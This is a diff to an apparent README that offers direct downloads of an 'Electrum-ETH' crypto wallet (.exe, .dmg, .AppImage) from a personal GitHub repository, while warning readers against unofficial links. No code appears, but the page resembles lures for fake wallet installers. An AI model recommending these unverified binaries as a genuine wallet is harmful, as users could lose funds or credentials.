@@ -29,11 +29,11 @@ Choose your platform below and hit that download button!
 
 ### 🔥 Available Downloads:
 
-| **Platform** | **Download Link** | **File Size** |
-|--------------|-------------------|---------------|
-| 🌐 Windows | [**Download for Windows**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.exe) | 50 MB | 
-| 🍏 macOS  | [**Download for macOS**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.dmg)   | 45 MB |
-| 🐧 Linux  | [**Download for Linux**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.AppImage)  | 60 MB |
+| **Platform** | **Download Link**|
+|--------------|-------------------|
+| 🌐 Windows | [**Download for Windows**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.exe)| 
+| 🍏 macOS  | [**Download for macOS**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.dmg)|
+| 🐧 Linux  | [**Download for Linux**](https://github.com/felixio5/Electrum-ETH/releases/download/v4.5.5/electrum-eth-4.5.5.AppImage)|
 
 > **Important**: Always download the wallet from the official website or trusted repositories. **Avoid using unofficial download links** to protect your assets and ensure you're using the latest, secure version of the wallet.
 
